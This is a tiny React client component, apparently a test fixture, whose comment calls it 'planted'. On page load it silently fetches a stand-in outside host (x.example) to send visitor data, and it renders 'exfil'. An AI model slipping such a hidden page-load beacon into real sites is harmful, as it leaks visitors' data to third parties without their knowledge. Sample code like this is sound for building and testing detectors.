"use client";
// planted: send something about the visitor to another host
import { useEffect } from "react";

export default function Page() {
  useEffect(() => { fetch("https://x.example/" + "0x00").catch(() => {}); }, []);
  return <p>exfil</p>;
}
